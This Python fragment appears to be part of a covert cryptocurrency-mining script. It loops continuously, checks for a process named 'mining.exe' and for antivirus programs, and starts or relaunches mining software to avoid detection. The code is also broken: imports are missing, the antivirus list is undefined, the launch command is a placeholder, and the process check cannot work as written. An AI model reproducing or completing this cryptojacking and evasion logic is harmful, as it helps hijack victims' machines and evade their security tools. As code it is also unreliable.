def is_running(program_name):
    try:
        subprocess.check_output(['tasklist'], shell=True)
        for line in subprocess.check_output(['findstr', program_name], shell=True).decode().split('\n'):
            return True
    except subprocess.CalledProcessError:
        return False

# Function to start mining process
def start_mining():
    os.system('start mining software')

# Function to hide mining process
def hide_mining():
    os.system('start taskkill /f /im mining.exe')
    os.system('start mining software')

# Function to check if mining software is running
def is_mining_running():
    return is_running('mining.exe')

# Function to check if antivirus is running
def is_antivirus_running():
    for program in antivirus_list:
        if is_running(program):
            return True
    return False

# Main script
while True:
    if not is_mining_running() and not is_antivirus_running():
        start_mining()
    else:
        hide_mining()
    time.sleep(random.randint(5, 10))
